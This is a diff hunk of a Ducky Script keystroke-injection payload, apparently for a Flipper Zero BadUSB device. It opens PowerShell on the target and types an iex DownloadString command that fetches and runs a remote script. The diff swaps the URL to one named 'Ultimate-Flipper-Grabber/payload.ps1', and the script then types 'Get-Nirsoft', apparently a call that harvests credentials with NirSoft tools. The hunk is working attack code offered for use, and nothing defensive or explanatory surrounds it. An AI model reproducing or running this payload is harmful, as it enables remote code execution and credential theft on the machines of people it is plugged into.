@@ -3,7 +3,7 @@ DELAY 1000
 STRING powershell
 ENTER
 DELAY 1000
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/blobs0/88d5880cf1a3b01aaed67500f044f996/raw'))
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/blobs0/Ultimate-Flipper-Grabber/main/payload.ps1'))
 ENTER
 STRING Get-Nirsoft
 ENTER
